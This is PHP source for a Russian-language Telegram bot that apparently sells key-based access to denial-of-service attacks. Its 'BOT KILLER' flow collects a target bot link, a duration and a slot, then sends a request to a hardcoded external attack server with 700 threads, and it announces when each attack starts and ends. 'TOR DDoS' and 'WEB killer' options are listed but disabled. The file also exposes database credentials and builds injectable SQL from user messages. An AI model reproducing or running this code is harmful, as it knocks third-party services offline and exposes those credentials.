<?php
ini_set('error_reporting', E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
include('./config.php');
$servername = "localhost";
$database = "rigik0j1_bot";
$username = "rigik0j1_bot";
$password = "xS61v&I2";
$tokens = "";


class DB {
    private static function connect() {
        $pdo = new PDO('mysql:host=localhost;dbname=rigik0j1_bot;charset=utf8mb4', 'rigik0j1_bot', 'xS61v&I2');
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return $pdo;
    }
    public static function query($query, $params = array()) {
        $statement = self::connect()->prepare($query);
        $statement->execute($params);

        if (explode(' ', $query)[0] == 'SELECT') {
            $data = $statement->fetchAll();
            return $data;
        }
    }

}

$send_data['chat_id'] = $data['chat'] ['id'];
$res = sendTelegram($method, $send_data);

function sendTelegram($method, $data, $headers = [])
{
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_POST           => 1,
        CURLOPT_HEADER         => 0,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_URL            => 'https://api.telegram.org/bot' . TOKEN . '/' . $method,
        CURLOPT_POSTFIELDS     => json_encode($data),
        CURLOPT_HTTPHEADER     => array_merge(["Content-Type: application/json"])
    ]);
    $result = curl_exec($curl);
    curl_close($curl);
    return (json_decode($result, 1) ? json_decode($result, 1) : $result);
}

if ($activate == '1')

{
    if ($message == '/menu')
    {
        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id=5752672859&parse_mode=html&text={$txt}", "r");

        $method = 'sendMessage';
        $send_data = [
            'text' => 'Тыкни на кнопку для запуска атаки'
        ];
    }
    $arr = explode(' ', trim($message));

    if ($message === '/start') {
        $method = 'sendMessage';
        $send_data = [
            'text'         => str_replace("\\n","\n", '🌟 Выберите функцию из меню которой хотите воспользоваться:\n\nWeb-панель: текст\nПароль: <code>текст</code>'),
            'parse_mode' => 'HTML',
            'reply_markup' => [
                'resize_keyboard' => true,
                'keyboard'        => [
                    [
                        ['text' => 'BOT KILLER🔪'],
                        ['text' => '🌹 TOR DDoS'],
                        ['text' => '🌟 WEB killer'],
    //                    ['text' => '🌐 Добавить/изменить IP'],

                    ],
                ]
            ]
        ];
    }

    if ($message === '🌟 WEB killer' || $message === '🌹 TOR DDoS') {
        $method = 'sendMessage';
        $send_data = [
            'text'         => '🫤 Функция временно отключена',
        ];
    }
    if ($message === '🌐 Добавить/изменить IP') {
        $sqll = mysqli_query($bd, "UPDATE users SET command='changeip' WHERE user_id='$sid'");
        $method = 'sendMessage';
        $send_data = [
            'text'         => 'Введите новый IP',
            'reply_markup' => [
                'resize_keyboard' => true,
                'keyboard'        => [
                    [
                        ['text' => '☑️ Вернуться в главное меню'],

                    ],
                ]
            ]
        ];
    }


    if ($message != '↪️ Отмена' or !$message != '☑️ Вернуться в главное меню')
    {
        if ($command === 'changeip') {
            $tgsrv = $contentssss.', '.$message;
            $sqll = mysqli_query($bd, "UPDATE users SET tgservers='$tgsrv' WHERE user_id='$sid'");
            $method = 'sendMessage';
            $send_data = [
                'text'         => '👻 Правки успешно внесены',
                'reply_markup' => [
                    'resize_keyboard' => true,
                    'keyboard'        => [
                        [
                            ['text' => 'BOT KILLER🔪'],
                            ['text' => '🌹 TOR DDoS'],
                            ['text' => '🌟 WEB killer'],
  //                          ['text' => '🌐 Добавить/изменить IP'],


                        ],
                    ]
                ]

            ];
            $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
            $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
            $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
            $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
            $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
            $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");




        }
// ататка BOT KILLER🔪
        if ($message == 'BOT KILLER🔪')
        {
//$file_ids = "CAACAgIAAxkBAAEFF6xise5IJYvxE0P5sjk4EaJST6TzOAACjBoAAjnmkUn-4N7ZGg0DqSkE";
            //$send_stickers = fopen("https://api.telegram.org/bot{$tokens}/sendSticker?chat_id={$sid}&sticker={$file_ids}", "r");


            $result = mysqli_query($bd, "UPDATE users SET command='slotch' WHERE user_id='$sid'");

            $method = 'sendMessage';
            $send_data = [
                'text'         => 'Выбери желаемый слот',
                'reply_markup' => [
                    'resize_keyboard' => true,
                    'keyboard'        => [
                        [
                            ['text' => '1'],
                            ['text' => '2'],
                            ['text' => '3'],
                            ['text' => '4'],
                            ['text' => '5'],
                        ],
                        [
                            ['text' => '↪️ Отмена'],

                        ],
                    ]
                ]
            ];

        }

        if ($command == 'slotch')
        {
//            $slot1 = mysqli_query($bd, "SELECT slot1 FROM users WHERE user_id='$sid'");
//            $slot2 = mysqli_query($bd, "SELECT slot2 FROM users WHERE user_id='$sid'");
//            $slot3 = mysqli_query($bd, "SELECT slot3 FROM users WHERE user_id='$sid'");
//            $slot4 = mysqli_query($bd, "SELECT slot4 FROM users WHERE user_id='$sid'");
//            $slot5 = mysqli_query($bd, "SELECT slot5 FROM users WHERE user_id='$sid'");





            if ($message !=  '↪️ Отмена' ) {

                $slot = $message;

//                $sql = "SELECT slot1 FROM users WHERE user_id='$sid'";
//                $slot1 = mysqli_query($bd, $sql)->fetch_assoc()['slot1'];
//                $sql = "SELECT slot2 FROM users WHERE user_id='$sid'";
//                $slot2 = mysqli_query($bd, $sql)->fetch_assoc()['slot2'];
//                $sql = "SELECT slot3 FROM users WHERE user_id='$sid'";
//                $slot3 = mysqli_query($bd, $sql)->fetch_assoc()['slot3'];
//                $sql = "SELECT slot4 FROM users WHERE user_id='$sid'";
//                $slot4 = mysqli_query($bd, $sql)->fetch_assoc()['slot4'];
//                $sql = "SELECT slot5 FROM users WHERE user_id='$sid'";
//                $slot5 = mysqli_query($bd, $sql)->fetch_assoc()['slot5'];
//
//                if ($message == '1' && $slot1 == '1') {
//
//                    $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
//                    $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
//                    $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
//                    $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
//                    $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
//                    $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");
//
//                    $send_data = [
//                        'text'         => '🐸 Данный слот недоступен для использования',
//                        'reply_markup' => [
//                            'resize_keyboard' => true,
//                            'keyboard'        => [
//                                [
//                                    ['text' => 'BOT KILLER🔪'],
//                                    ['text' => '🌹 TOR DDoS'],
//                                    ['text' => '🌟 WEB killer'],
//                                    //                              ['text' => '🌐 Добавить/изменить IP'],
//
//                                ],
//                            ]
//                        ]
//                    ];
//
//                    $send_data['chat_id'] = $data['chat'] ['id'];
//                    $res = sendTelegram($method, $send_data);
//                }
//
//                else if ($message == '2' && $slot2 == '1') {
//
//                    $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
//                    $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
//                    $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
//                    $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
//                    $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
//                    $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");
//
//                    $send_data = [
//                        'text'         => '🐸 Данный слот недоступен для использования',
//                        'reply_markup' => [
//                            'resize_keyboard' => true,
//                            'keyboard'        => [
//                                [
//                                    ['text' => 'BOT KILLER🔪'],
//                                    ['text' => '🌹 TOR DDoS'],
//                                    ['text' => '🌟 WEB killer'],
//                                    //                              ['text' => '🌐 Добавить/изменить IP'],
//
//                                ],
//                            ]
//                        ]
//                    ];
//
//                    $send_data['chat_id'] = $data['chat'] ['id'];
//                    $res = sendTelegram($method, $send_data);
//                }
//
//                else if ($message == '3' && $slot3 == '1') {
//
//                    $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
//                    $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
//                    $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
//                    $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
//                    $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
//                    $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");
//
//                    $send_data = [
//                        'text'         => '🐸 Данный слот недоступен для использования',
//                        'reply_markup' => [
//                            'resize_keyboard' => true,
//                            'keyboard'        => [
//                                [
//                                    ['text' => 'BOT KILLER🔪'],
//                                    ['text' => '🌹 TOR DDoS'],
//                                    ['text' => '🌟 WEB killer'],
//                                    //                              ['text' => '🌐 Добавить/изменить IP'],
//
//                                ],
//                            ]
//                        ]
//                    ];
//
//                    $send_data['chat_id'] = $data['chat'] ['id'];
//                    $res = sendTelegram($method, $send_data);
//                }
//
//
//                else if ($message == '4' && $slot4 == '1') {
//
//                    $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
//                    $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
//                    $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
//                    $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
//                    $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
//                    $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");
//
//                    $send_data = [
//                        'text'         => '🐸 Данный слот недоступен для использования',
//                        'reply_markup' => [
//                            'resize_keyboard' => true,
//                            'keyboard'        => [
//                                [
//                                    ['text' => 'BOT KILLER🔪'],
//                                    ['text' => '🌹 TOR DDoS'],
//                                    ['text' => '🌟 WEB killer'],
//                                    //                              ['text' => '🌐 Добавить/изменить IP'],
//
//                                ],
//                            ]
//                        ]
//                    ];
//
//                    $send_data['chat_id'] = $data['chat'] ['id'];
//                    $res = sendTelegram($method, $send_data);
//                }
//
//
//                else if ($message == "5" && $slot5 == "1") {
//
//                    $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
//                    $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
//                    $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
//                    $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
//                    $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
//                    $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");
//
//                    $send_data = [
//                        'text'         => '🐸 Данный слот недоступен для использования',
//                        'reply_markup' => [
//                            'resize_keyboard' => true,
//                            'keyboard'        => [
//                                [
//                                    ['text' => 'BOT KILLER🔪'],
//                                    ['text' => '🌹 TOR DDoS'],
//                                    ['text' => '🌟 WEB killer'],
//                                    //                              ['text' => '🌐 Добавить/изменить IP'],
//
//                                ],
//                            ]
//                        ]
//                    ];
//
//                    $send_data['chat_id'] = $data['chat'] ['id'];
//                    $res = sendTelegram($method, $send_data);
//
//                }


                $result = mysqli_query($bd, "UPDATE users SET slot='$message' WHERE user_id='$sid'");
                $method = 'sendMessage';
                $send_data = [
                    'text'         => '🐸 Введите ссылку бота' . chr(10) . 'Пример https://t.me/example_bot',
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => '↪️ Отмена'],

                            ],
                        ]
                    ]
                ];

                $result = mysqli_query($bd, "UPDATE users SET command='link_tg' WHERE user_id='$sid'");
            } else {
                $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
                $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
                $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
                $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
                $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
                $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");


                $method = 'sendMessage';
                $send_data = [
                    'text'         => str_replace("\\n","\n", '🌟 Выберите функцию из меню которой хотите воспользоваться:\n\nWeb-панель: текст\nПароль: <code>текст</code>'),
                    'parse_mode' => 'HTML',
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => 'BOT KILLER🔪'],
                                ['text' => '🌹 TOR DDoS'],
                                ['text' => '🌟 WEB killer'],
  //                              ['text' => '🌐 Добавить/изменить IP'],


                            ],
                        ]
                    ]
                ];


            }
        }

        if ($command == 'link_tg')
        {
            if ($message !=  '↪️ Отмена' ) {
                $result = mysqli_query($bd, "UPDATE users SET target='$message' WHERE user_id='$sid'");
                $method = 'sendMessage';
                $send_data = [
                    'text'         => '🕥 Введите время атаки в секундах',
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => '↪️ Отмена'],

                            ],
                        ]
                    ]
                ];

                $result = mysqli_query($bd, "UPDATE users SET command='success' WHERE user_id='$sid'");
            } else {
                $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
                $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
                $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
                $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
                $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
                $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");


                $method = 'sendMessage';
                $send_data = [
                    'text'         => str_replace("\\n","\n", '🌟 Выберите функцию из меню которой хотите воспользоваться:\n\nWeb-панель: текст\nПароль: <code>текст</code>'),
                    'parse_mode' => 'HTML',
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => 'BOT KILLER🔪'],
                                ['text' => '🌹 TOR DDoS'],
                                ['text' => '🌟 WEB killer'],
   //                             ['text' => '🌐 Добавить/изменить IP'],


                            ],
                        ]
                    ]
                ];


            }
        }

        if ($command == 'success')
        {
            if ($message !=  '↪️ Отмена' ) {
                $time = $message;
                $result = mysqli_query($bd, "UPDATE users SET time='$message' WHERE user_id='$sid'");
                if ($time >= '1' && $time <= '2000') {
//                $sql = "SELECT time FROM users WHERE user_id=$sid";
//                $time = $bd->query($sql);
                $method = 'sendMessage';
                $send_data = [
                    'text'         => 'Подтвердите данные запуска' .chr(10) .chr(10) .

'🎯 Цель: ' . $target . chr(10) .
                        '📮 Время атаки: ' . $time . " sec." . chr(10) .
'🎛 Слот: ' . $slot,
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => '✅️ Запустить'],

                            ],
                        ]
                    ]
                ];


                $result = mysqli_query($bd, "UPDATE users SET command='slotg' WHERE user_id='$sid'");
                }
                else {
                    $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");



                    $method = 'sendMessage';
                    $send_data = [
                        'text'         => str_replace("\\n","\n", 'Укажите время от 1 до 2000 секунд.'),
                        'parse_mode' => 'HTML',
                        'reply_markup' => [
                            'resize_keyboard' => true,
                            'keyboard'        => [
                                [
                                    //                             ['text' => '🌐 Добавить/изменить IP'],


                                ],
                            ]
                        ]
                    ];
                }
            } else {
                $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
                $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
                $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
                $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
                $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
                $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");


                $method = 'sendMessage';
                $send_data = [
                    'text'         => str_replace("\\n","\n", '🌟 Выберите функцию из меню которой хотите воспользоваться:\n\nWeb-панель: текст\nПароль: <code>текст</code>'),
                    'parse_mode' => 'HTML',
                    'reply_markup' => [
                        'resize_keyboard' => true,
                        'keyboard'        => [
                            [
                                ['text' => 'BOT KILLER🔪'],
                                ['text' => '🌹 TOR DDoS'],
                                ['text' => '🌟 WEB killer'],
   //                             ['text' => '🌐 Добавить/изменить IP'],


                            ],
                        ]
                    ]
                ];


            }
        }

        if ($command == 'slotg')
//            $result = mysqli_query($bd, "UPDATE users SET time='$message' WHERE user_id='$sid'");
        {
            $result = mysqli_query($bd, "UPDATE users SET command=' ' WHERE user_id='$sid'");

            $method = 'sendMessage';
            $send_data = [
                'text'         => '🧨 Запрос поступил на сервера, через 5 минут упадет бот (прогреваются сессии)' . chr(10) . 'После запуска вам прийдет уведомление',
            'parse_mode' => 'HTML',
                'reply_markup' => [
                    'resize_keyboard' => true,
                    'keyboard'        => [
                        [

                            ['text' => 'BOT KILLER🔪'],
                            ['text' => '🌹 TOR DDoS'],
                            ['text' => '🌟 WEB killer'],
                            //                                 ['text' => '🌐 Добавить/изменить IP'],


                        ],
                    ]
                ]
            ];

            $send_data['chat_id'] = $data['chat'] ['id'];
            $res = sendTelegram($method, $send_data);

            $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");


            if ($time >= '1')
            {


                file_put_contents('logfile.log', $message . $sid);

                $sql = "SELECT * FROM users WHERE user_id=$admin_id";
                $result = $bd->query($sql);
                if ($result->num_rows > 0)
                {
                    while ($row = $result->fetch_assoc())
                    {
                        $slot = $row["slot"];
                        $slot1 = $row["slot1"];
                        $slot2 = $row["slot2"];
                        $slot3 = $row["slot3"];
                        $slot4 = $row["slot4"];
                        $slot5 = $row["slot5"];
                        $message_dos = $row["message"];
                        $method = $row["method"];
                        $command = $row["command"];
                        $target = $row["target"];
                        $thread = $row["thread"];
                        $time = $row["time"];
                        $contentssss = $row["tgservers"];

                    }

                }


                $servers = explode(", ", $contentssss);

                if ($message_dos == 'BOT') {
                    foreach ($servers as $server) {
                        $datae = DB::query('SELECT * FROM users WHERE id=100', array(':uid' => 1553833751))[0];
                        $thread = $datae['thread'];
                        $time = $datae['time'];
                        $target = $datae['target'];
                        $dat = file_get_contents('http://185.106.92.208:8000/tg?thread=700&time=' . $time . '&target=' . $target . '&method=/start');
//http_build_query($query));
                        $message_dos = '/start';
                        $slot = $datae["slot"];
                        $slot1 = $row["slot1"];
                        $slot2 = $row["slot2"];
                        $slot3 = $row["slot3"];
                        $slot4 = $row["slot4"];
                        $slot5 = $row["slot5"];
                    }
                }
                else
                {
                    if ($sid != $admin_id)
                    {
                        $txt = 'Юзер @' . $sun . ' ' . $sid . ' запустил атаку на ' . $time . ' секунд %0A %0A BOT: ' . $target . '%0A%0A Сервачки: ' . $contentssss;
                        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id={$admin_id}&parse_mode=html&text={$txt}", "r");
                    }
                }
                $sql = "SELECT * FROM users WHERE user_id=$admin_id";
                $result = $bd->query($sql);
                if ($result->num_rows > 0)
                {
                    while ($row = $result->fetch_assoc())
                    {

                        $message_dos = $row["message"];
                        $method = $row["method"];
                        $command = $row["command"];
                        $target = $row["target"];
                        $thread = $row["thread"];
                        $time = $row["time"];
                        $contentssss = $row["tgservers"];
                        $slot = $row["slot"];
                        $slot1 = $row["slot1"];
                        $slot2 = $row["slot2"];
                        $slot3 = $row["slot3"];
                        $slot4 = $row["slot4"];
                        $slot5 = $row["slot5"];

                    }

                }
                if ($command == 'slotg') {
                    if ($slot == 1) {
                        $dat = file_get_contents('http://185.106.92.208:8000/tg?thread=700&time=' . $time . '&target=' . $target . '&method=/start');
//                        $result = mysqli_query($bd, "UPDATE users SET slot1=1 WHERE user_id='$sid'");
                    }
                    else if ($slot == 2) {
                        $dat = file_get_contents('http://185.106.92.208:8000/tg?thread=700&time=' . $time . '&target=' . $target . '&method=/start');
//                        $result = mysqli_query($bd, "UPDATE users SET slot2=1 WHERE user_id='$sid'");
                    }
                    else if ($slot == 3) {
                        $dat = file_get_contents('http://185.106.92.208:8000/tg?thread=700&time=' . $time . '&target=' . $target . '&method=/start');
//                        $result = mysqli_query($bd, "UPDATE users SET slot3=1 WHERE user_id='$sid'");
                    }
                    else if ($slot == 4) {
                        $dat = file_get_contents('http://185.106.92.208:8000/tg?thread=700&time=' . $time . '&target=' . $target . '&method=/start');
//                        $result = mysqli_query($bd, "UPDATE users SET slot4=1 WHERE user_id='$sid'");
                   }
                    else if ($slot == 5) {
                        $dat = file_get_contents('http://185.106.92.208:8000/tg?thread=700&time=' . $time . '&target=' . $target . '&method=/start');
//                        $result = mysqli_query($bd, "UPDATE users SET slot5=1 WHERE user_id='$sid'");
                    }

                    $result = mysqli_query($bd, "UPDATE users SET command=' ' WHERE user_id='$sid'");
                    $result1 = mysqli_query($bd, "UPDATE users SET target=' ' WHERE user_id='$sid'");
                    $result2 = mysqli_query($bd, "UPDATE users SET method=' ' WHERE user_id='$sid'");
                    $result3 = mysqli_query($bd, "UPDATE users SET thread=' ' WHERE user_id='$sid'");
                    $result4 = mysqli_query($bd, "UPDATE users SET time=' ' WHERE user_id='$sid'");
                    $result5 = mysqli_query($bd, "UPDATE users SET slot=' ' WHERE user_id='$sid'");

                    sleep(300);
                    $method = 'sendMessage';
                    /*$timenew = DB::query('SELECT time FROM users WHERE user_id=:id', array(':id'=>$admin_id))[0]['time'];
                    $targetnew = DB::query('SELECT target FROM users WHERE user_id=:id', array(':id'=>$admin_id))[0]['target'];*/
                    $send_data = [
                        'text'         => ' ✅ Атака успешно запущена' . chr(10) . chr(10) . '❗️ Цель: ' . $target  . chr(10) . '📮 Время атаки: ' . $time. ' sec.' . chr(10) . "🎛️ Слот номер: " . $slot ,
                        'reply_markup' => [
                            'resize_keyboard' => true,
                            'keyboard'        => [
                                [
                                    ['text' => 'BOT KILLER🔪'],
                                    ['text' => '🌹 TOR DDoS'],
                                    ['text' => '🌟 WEB killer'],
   //                                 ['text' => '🌐 Добавить/изменить IP'],

                                ],
                            ]
                        ]

                    ];
                                $send_data['chat_id'] = $data['chat'] ['id'];
                                $res = sendTelegram($method, $send_data);

                                sleep($time);
                    $method = 'sendMessage';
                    /*$timenew = DB::query('SELECT time FROM users WHERE user_id=:id', array(':id'=>$admin_id))[0]['time'];
                    $targetnew = DB::query('SELECT target FROM users WHERE user_id=:id', array(':id'=>$admin_id))[0]['target'];*/
                    $send_data = [
                        'text'         => '✅ Атака успешно завершена ' . chr(10)  .chr(10) .  "🎛️ Слот номер: " . $slot ,
                        'reply_markup' => [
                            'resize_keyboard' => true,
                            'keyboard'        => [
                                [
                                    ['text' => 'BOT KILLER🔪'],
                                    ['text' => '🌹 TOR DDoS'],
                                    ['text' => '🌟 WEB killer'],
                                    //                                 ['text' => '🌐 Добавить/изменить IP'],

                                ],
                            ]
                        ]
                    ];

//                    if ($slot == "1") {
//                        $result = mysqli_query($bd, "UPDATE users SET slot1=0 WHERE user_id='$sid'");
//                    }
//                    else if ($slot == "2") {
//                        $result = mysqli_query($bd, "UPDATE users SET slot2=0 WHERE user_id='$sid'");
//                    }
//                    else if ($slot == "3") {
//                        $result = mysqli_query($bd, "UPDATE users SET slot3=0 WHERE user_id='$sid'");
//                    }
//                    else if ($slot == "4") {
//                        $result = mysqli_query($bd, "UPDATE users SET slot4=0 WHERE user_id='$sid'");
//                    }
//                    else if ($slot == "5") {
//                        $result = mysqli_query($bd, "UPDATE users SET slot5=0 WHERE user_id='$sid'");
//                    }

                    $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
                    $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
                    $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
                    $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
                    $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
                    $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");


                }
            }

        }
    }
    else
    {

        $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
        $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
        $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
        $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
        $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
        $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");


        $method = 'sendMessage';
        $send_data = [
            'text'         => str_replace("\\n","\n", '🌟 Выберите функцию из меню которой хотите воспользоваться:\n\nWeb-панель: текст\nПароль: <code>текст</code>'),
            'parse_mode' => 'HTML',
            'reply_markup' => [
                'resize_keyboard' => true,
                'keyboard'        => [
                    [
                        ['text' => 'BOT KILLER🔪'],
                        ['text' => '🌹 TOR DDoS'],
                        ['text' => '🌟 WEB killer'],
 //                       ['text' => '🌐 Добавить/изменить IP'],


                    ],
                ]
            ]
        ];
    }
}
else
{

    $result = mysqli_query($bd, "UPDATE users SET command='' WHERE user_id='$sid'");
    $result1 = mysqli_query($bd, "UPDATE users SET target='' WHERE user_id='$sid'");
    $result2 = mysqli_query($bd, "UPDATE users SET method='' WHERE user_id='$sid'");
    $result3 = mysqli_query($bd, "UPDATE users SET thread='' WHERE user_id='$sid'");
    $result4 = mysqli_query($bd, "UPDATE users SET time='' WHERE user_id='$sid'");
    $result5 = mysqli_query($bd, "UPDATE users SET slot='' WHERE user_id='$sid'");

// другие команды
    //Создание юзера, добавления и генерация ключей
    if ($message == '/start')
    {
        $randomChars = '0123456789abcdefghijklmnopqrstuvwxyz';
        $randKey = substr(str_shuffle($randomChars), 0, 15);

        $results = mysqli_query($bd, "SELECT id FROM users WHERE user_id='$sid'")->fetch_all();
        $myrow = mysqli_fetch_array($results);

        file_put_contents('logger.log', $myrow);

        if ($myrow['activate'] == 1)
        {
            $method = 'sendMessage';
            $send_data = [
                'text' => 'Вы уже авторизованы! Напишите /menu',
            ];
        }

        if (empty($myrow))
        {
            $sqll = mysqli_query($bd, "INSERT INTO users (user_id, name, command, userkey) VALUES ('$sid', '', 'auth', '{$randKey}')");
        }

        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id={$admin_id}&parse_mode=html&text={$txt}", "r");

        $method = 'sendMessage';
        $send_data = [
            'text' => '🔐 Для использования бота , введите ключ-доступа',
        ];
    }

    if ($message == '/menu')
    {
        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id=5752672859&parse_mode=html&text={$txt}", "r");

        $method = 'sendMessage';
        $send_data = [
            'text' => 'Тыкни на кнопку для запуска атаки'
        ];
    }

    if ($message != '/start' && $message !== '/menu')
    {
        //send message handler
        $sendToTelegram = fopen("https://api.telegram.org/bot{$tokens}/sendMessage?chat_id={$admin_id}&parse_mode=html&text={$txt}", "r");

        //checker
        $getUserForKey = mysqli_query($bd, "SELECT * FROM `users` WHERE `userkey` = '{$message}'")->fetch_all();

        if (!empty($getUserForKey))
        {
            mysqli_query($bd, "UPDATE `users` SET `activate` = 1  WHERE `userkey` = '{$message}'");

            $method = 'sendMessage';
            $send_data = [
                'text'         => str_replace("\\n","\n", '🌟 Выберите функцию из меню которой хотите воспользоваться:\n\nWeb-панель: текст\nПароль: <code>текст</code>'),
                'parse_mode' => 'HTML',
                'reply_markup' => [
                    'resize_keyboard' => true,
                    'keyboard'        => [
                        [
                            ['text' => 'BOT KILLER🔪'],
                            ['text' => '🌹 TOR DDoS'],
                            ['text' => '🌟 WEB killer'],
     //                       ['text' => '🌐 Добавить/изменить IP'],


                        ],
                    ]
                ]
            ];
        } else
        {
            $method = 'sendMessage';
            $send_data = [
                'text' => '❌ Вы ввели неверный ключ , попробуйте еще раз ! ',
            ];
        }
    }

}

$send_data['chat_id'] = $data['chat'] ['id'];
$res = sendTelegram($method, $send_data);

?>